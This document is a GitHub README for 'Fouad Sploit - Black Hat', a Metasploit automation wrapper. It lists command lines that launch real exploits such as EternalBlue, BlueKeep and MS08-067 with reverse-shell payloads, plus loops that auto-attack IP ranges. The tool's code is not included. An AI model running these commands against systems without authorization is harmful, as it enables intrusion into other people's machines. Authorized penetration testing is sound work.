<div align="center">

<img src="icon1.png" alt="Fouad Sploit Logo" width="250"/>

# 🎯 FOUAD SPLOIT - BLACK HAT

<h3>⚡ Advanced Metasploit Automation Framework ⚡</h3>

<p align="center">
  <img src="https://img.shields.io/badge/version-2.0-blue.svg?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/python-3.6+-green.svg?style=for-the-badge&logo=python"/>
  <img src="https://img.shields.io/badge/license-MIT-orange.svg?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/platform-Linux-lightgrey.svg?style=for-the-badge&logo=linux"/>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Metasploit-Framework-red.svg?style=flat-square&logo=metasploit"/>
  <img src="https://img.shields.io/badge/Kali-Linux-557C94.svg?style=flat-square&logo=kalilinux"/>
  <img src="https://img.shields.io/badge/Security-Penetration%20Testing-critical.svg?style=flat-square"/>
  <img src="https://img.shields.io/badge/Status-Active-success.svg?style=flat-square"/>
</p>

<h4>🚀 Ultimate Metasploit Automation with Intelligent Port Detection & Auto-Run 🚀</h4>

<p align="center">
  <a href="#-about">About</a> •
  <a href="#-features">Features</a> •
  <a href="#-quick-start">Quick Start</a> •
  <a href="#-usage">Usage</a> •
  <a href="#-examples">Examples</a> •
  <a href="#-contact">Contact</a>
</p>

<hr/>

</div>

<div align="center">
  <table>
    <tr>
      <td align="center">🤖<br/><b>Auto-Run</b></td>
      <td align="center">🔍<br/><b>Port Scan</b></td>
      <td align="center">🎯<br/><b>Smart Target</b></td>
      <td align="center">📦<br/><b>All Exploits</b></td>
      <td align="center">⚡<br/><b>Fast Deploy</b></td>
    </tr>
  </table>
</div>

---

## 📖 About

**Fouad Sploit Black Hat** is a cutting-edge penetration testing automation framework built on Metasploit. It revolutionizes exploitation with intelligent automation, smart port detection, and seamless execution - wrapped in a beautifully styled interface.

**Perfect for:** Authorized penetration tests • Security research • CTF challenges • Ethical hacking training

<div align="center">

| 💻 **600+ Lines** | 🎯 **20+ Exploits** | 🔍 **22+ Ports** | 🔧 **4 Modes** |
|---|---|---|---|
| Python Code | Supported | Scanned | Operation |

</div>

---

## ✨ Features

### 🚀 Core Capabilities
- 🎨 **Professional Banner** - Eye-catching "FOUAD SPLOIT" ASCII art
- 🤖 **Auto-Run Mode** - Fully automated exploitation, zero configuration
- 🔍 **Port Scanner** - Automatic detection of 22+ common ports
- 🎯 **Smart Targeting** - Auto LHOST/LPORT configuration  
- 📦 **MSF Integration** - Complete Metasploit modules access
- 🔧 **Multiple Modes** - Interactive, Auto, Manual, Scan
- 📝 **RC Generation** - Automatic resource file creation
- 🎨 **Color Interface** - Professional status indicators
- ⚡ **Fast Deploy** - Target to shell in <60 seconds

### 🛠️ Advanced Features
- 🔎 Service Detection (HTTP, SMB, FTP, SSH, RDP, MySQL, PostgreSQL)
- 💡 Smart exploit suggestions based on detected services
- 🎯 Multi-payload support (Meterpreter TCP/HTTPS, Shell, Custom)
- 📊 Customizable port scanning
- 🔄 Automatic session handling
- 🔐 Payload encoding (Shikata Ga Nai)
- 📝 Detailed logging with timestamps

---

## 📋 Requirements

| Component | Version | Required |
|-----------|---------|----------|
| 💻 Linux/Kali | Any | ✅ Recommended |
| 🐍 Python 3 | 3.6+ | ✅ Required |
| 🎯 Metasploit | 5.x/6.x | ✅ Required |
| 👤 Root/Sudo | - | ⚠️ Optional |

**Dependencies:** Metasploit Framework (`msfconsole` in PATH), Python standard library (socket, subprocess, argparse)

---

## 🚀 Quick Start

```bash
# 1️⃣ Clone repository
git clone https://github.com/fouad/fouad-sploit.git
cd fouad-sploit

# 2️⃣ Make executable  
chmod +x fouad_sploit.py

# 3️⃣ Run auto mode
./fouad_sploit.py --auto --target 192.168.1.100

# 4️⃣ Or interactive mode
./fouad_sploit.py --interactive
```

---

## 💻 Installation

**Kali Linux (Recommended):**
```bash
sudo msfupdate
git clone https://github.com/fouad/fouad-sploit.git
cd fouad-sploit && chmod +x fouad_sploit.py setup.sh
./setup.sh  # Optional auto-setup
```

**Ubuntu/Debian:**
```bash
# Install Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall && sudo ./msfinstall

# Install Fouad Sploit
git clone https://github.com/fouad/fouad-sploit.git
cd fouad-sploit && chmod +x fouad_sploit.py
```

**macOS:**
```bash
brew install metasploit
git clone https://github.com/fouad/fouad-sploit.git
cd fouad-sploit && chmod +x fouad_sploit.py
```

---

## 📖 Usage

### 🎮 Operation Modes

| Mode | Command | Description | Best For |
|------|---------|-------------|----------|
| 🤖 **Auto** | `--auto` | Fully automated | Quick exploitation |
| 💬 **Interactive** | `--interactive` | Guided setup | Beginners |
| ⚙️ **Manual** | `-t -p -e` | Full control | Advanced users |
| 🔍 **Scan** | `--scan` | Port detection | Reconnaissance |

### 1️⃣ Auto Mode (Recommended)

```bash
./fouad_sploit.py --auto --target 192.168.1.100
```

**What it does:** Port scan → Service detection → Exploit selection → Auto config → Execute

### 2️⃣ Interactive Mode

```bash
./fouad_sploit.py --interactive
```

**Features:** Step-by-step prompts • Port selection • Exploit suggestions • Payload menu • Real-time preview

### 3️⃣ Manual Mode

```bash
./fouad_sploit.py \
  --target 192.168.1.100 \
  --port 445 \
  --lhost 192.168.1.50 \
  --lport 4444 \
  --exploit exploit/windows/smb/ms17_010_eternalblue \
  --payload windows/meterpreter/reverse_tcp
```

### 4️⃣ Scan Mode

```bash
./fouad_sploit.py --target 192.168.1.100 --scan
```

---

## 🎛️ Command Options

```
  -h, --help              Show help message
  -t, --target TARGET     Target IP address
  -p, --port PORT         Target port number
  -l, --lhost LHOST       Local host (reverse connection)
  -L, --lport LPORT       Local port (default: 4444)
  -e, --exploit EXPLOIT   Metasploit exploit module
  -P, --payload PAYLOAD   Payload type
  -a, --auto              Auto mode
  -s, --scan              Scan ports only
  -i, --interactive       Interactive mode
  -o, --output OUTPUT     Output file (default: fouad_sploit.rc)
```

---

## 🎯 Examples

### Example 1: Quick Auto-Attack
```bash
./fouad_sploit.py -a -t 192.168.1.100
```

### Example 2: EternalBlue SMB
```bash
./fouad_sploit.py -t 192.168.1.100 -p 445 \
  -e exploit/windows/smb/ms17_010_eternalblue
```

### Example 3: HTTP Tomcat
```bash
./fouad_sploit.py -t 10.10.10.40 -p 8080 \
  -e exploit/multi/http/tomcat_mgr_upload
```

### Example 4: FTP Backdoor
```bash
./fouad_sploit.py -t 192.168.1.50 -p 21 \
  -e exploit/unix/ftp/vsftpd_234_backdoor
```

### Example 5: Custom LHOST
```bash
./fouad_sploit.py -t 10.10.10.40 -p 445 -l 10.10.14.5 -L 4444 \
  -e exploit/windows/smb/ms08_067_netapi
```

### Example 6: Batch Multiple Targets
```bash
for ip in 192.168.1.{10..20}; do
    ./fouad_sploit.py -a -t $ip
done
```

---

## 📊 Supported Exploits

### 💻 SMB Exploits
- `exploit/windows/smb/ms17_010_eternalblue` - EternalBlue (Win 7/2008)
- `exploit/windows/smb/ms08_067_netapi` - MS08-067 (Win XP/2003)
- `exploit/windows/smb/ms17_010_psexec` - EternalBlue PSExec

### 🌐 Web Exploits
- `exploit/multi/http/tomcat_mgr_upload` - Tomcat Manager Upload
- `exploit/unix/webapp/php_thumb_shell_upload` - PHP Shell Upload
- `exploit/multi/http/struts2_content_type_ognl` - Struts2 OGNL

### 📁 FTP Exploits
- `exploit/unix/ftp/vsftpd_234_backdoor` - vsftpd 2.3.4 Backdoor
- `exploit/windows/ftp/ms09_053_ftpd_nlst` - Windows FTP Overflow

### 🗄️ Database Exploits
- `exploit/multi/mysql/mysql_udf_payload` - MySQL UDF
- `exploit/linux/postgres/postgres_payload` - PostgreSQL Payload
- `auxiliary/scanner/mysql/mysql_login` - MySQL Brute Force

### 🖥️ RDP Exploits
- `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` - BlueKeep RCE
- `auxiliary/scanner/rdp/rdp_scanner` - RDP Scanner

---

## 🐛 Troubleshooting

**Metasploit Not Found:**
```bash
which msfconsole
export PATH=$PATH:/opt/metasploit-framework/bin
```

**Permission Denied:**
```bash
chmod +x fouad_sploit.py
sudo ./fouad_sploit.py -a -t TARGET
```

**No Ports Found:**
```bash
ping TARGET
nmap -sn TARGET
./fouad_sploit.py -t TARGET -p 445  # Manual port
```

---

## 💻 Code Integration

**Bash Script:**
```bash
#!/bin/bash
for target in $(cat targets.txt); do
    ./fouad_sploit.py -a -t "$target"
done
```

**Python Wrapper:**
```python
import subprocess
subprocess.run(['./fouad_sploit.py', '-a', '-t', '192.168.1.100'])
```

**Docker:**
```dockerfile
FROM kalilinux/kali-rolling
RUN apt-get update && apt-get install -y metasploit-framework python3
COPY . /opt/fouad-sploit
WORKDIR /opt/fouad-sploit
RUN chmod +x fouad_sploit.py
ENTRYPOINT ["./fouad_sploit.py"]
```

---

## ⚠️ Legal Disclaimer

**IMPORTANT:** This tool is for **AUTHORIZED TESTING and EDUCATIONAL PURPOSES ONLY**

✅ **Allowed:** Authorized penetration tests • Educational labs • CTF challenges • Security research  
❌ **Prohibited:** Unauthorized access • Illegal activities • Causing damage

**The author is not responsible for misuse. Always obtain written permission before testing any system.**

---

## 🎓 Learning Resources

- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [Rapid7 Metasploit Docs](https://docs.rapid7.com/metasploit/)
- [HackTheBox Academy](https://academy.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

## 📞 Contact

<div align="center">

<img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&weight=600&size=28&pause=1000&color=00FF00&center=true&vCenter=true&width=600&lines=Contact+Developer+Fouad;Open+for+Collaboration!" alt="Typing SVG" />

<br/><br/>

### 👨‍💻 Developer: Fouad

<table>
  <tr>
    <td align="center">
      <a href="https://instagram.com/1.pvl">
        <img src="https://img.shields.io/badge/Instagram-@1.pvl-E4405F?style=for-the-badge&logo=instagram&logoColor=white"/>
      </a>
      <br/><b>📱 Follow on Instagram</b><br/><code>@1.pvl</code>
    </td>
    <td align="center">
      <a href="mailto:zalaffouad37@gmail.com">
        <img src="https://img.shields.io/badge/Email-zalaffouad37@gmail.com-D14836?style=for-the-badge&logo=gmail&logoColor=white"/>
      </a>
      <br/><b>📧 Send Email</b><br/><code>zalaffouad37@gmail.com</code>
    </td>
  </tr>
</table>

**💡 Questions • 🐛 Bug Reports • ✨ Feature Requests • 🤝 Collaboration**

<img src="https://img.shields.io/badge/Response%20Time-24%20Hours-success?style=flat-square"/>
<img src="https://img.shields.io/badge/Availability-Always%20Open-brightgreen?style=flat-square"/>

</div>

---

## 🤝 Contributing

Contributions welcome! Please:
1. Fork the project
2. Create feature branch (`git checkout -b feature/NewFeature`)
3. Commit changes (`git commit -m 'Add NewFeature'`)
4. Push to branch (`git push origin feature/NewFeature`)
5. Open Pull Request

---

## ⭐ Show Support

If this project helped you:
- ⭐ Star the repository
- 🐛 Report bugs and issues
- 💡 Suggest new features
- 📢 Share with your network

---

## 📄 License

**MIT License** © 2025 Fouad

Permission is granted to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of this software, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.

---

## 🔐 Security & Compliance

- ✅ Open-source and auditable
- ✅ No data collection or telemetry
- ✅ No backdoors or malicious code
- ✅ Follows ethical hacking guidelines
- ✅ GDPR compliant (no data storage)

---

## 🏆 Acknowledgments

- **Metasploit Framework** - Rapid7 Team
- **Python Community** - For excellent libraries
- **Security Researchers** - For vulnerability discoveries
- **Kali Linux** - Perfect testing platform

---

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=6,11,20&height=150&section=header&text=FOUAD%20SPLOIT&fontSize=40&fontColor=fff&animation=twinkling" width="100%"/>

<br/>

### 🎯 FOUAD SPLOIT - BLACK HAT

<br/>

<table>
  <tr>
    <td align="center">
      <img src="https://img.icons8.com/fluency/96/security-checked.png" width="50"/><br/><b>Secure</b>
    </td>
    <td align="center">
      <img src="https://img.icons8.com/fluency/96/code.png" width="50"/><br/><b>Open Source</b>
    </td>
    <td align="center">
      <img src="https://img.icons8.com/fluency/96/fast-forward.png" width="50"/><br/><b>Fast</b>
    </td>
    <td align="center">
      <img src="https://img.icons8.com/fluency/96/test-passed.png" width="50"/><br/><b>Tested</b>
    </td>
  </tr>
</table>

<br/>

<img src="https://img.shields.io/badge/Made%20with-❤️-red?style=for-the-badge"/>
<img src="https://img.shields.io/badge/By-Fouad-blue?style=for-the-badge"/>

<br/><br/>

### ⚠️ With great power comes great responsibility. Use ethically! 🛡️

<br/>

<table>
  <tr>
    <td align="center">
      <a href="https://github.com/fouad">
        <img src="https://img.shields.io/badge/GitHub-Follow-181717?style=for-the-badge&logo=github"/>
      </a>
    </td>
    <td align="center">
      <a href="https://instagram.com/1.pvl">
        <img src="https://img.shields.io/badge/Instagram-@1.pvl-E4405F?style=for-the-badge&logo=instagram"/>
      </a>
    </td>
    <td align="center">
      <a href="mailto:zalaffouad37@gmail.com">
        <img src="https://img.shields.io/badge/Email-Contact-D14836?style=for-the-badge&logo=gmail"/>
      </a>
    </td>
  </tr>
</table>

<br/>

**© 2025 Fouad. All Rights Reserved.**

<br/>

<img src="https://komarev.com/ghpvc/?username=fouad-sploit&label=Views&color=brightgreen&style=flat-square"/>

<br/><br/>

<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=6,11,20&height=100&section=footer" width="100%"/>

</div>
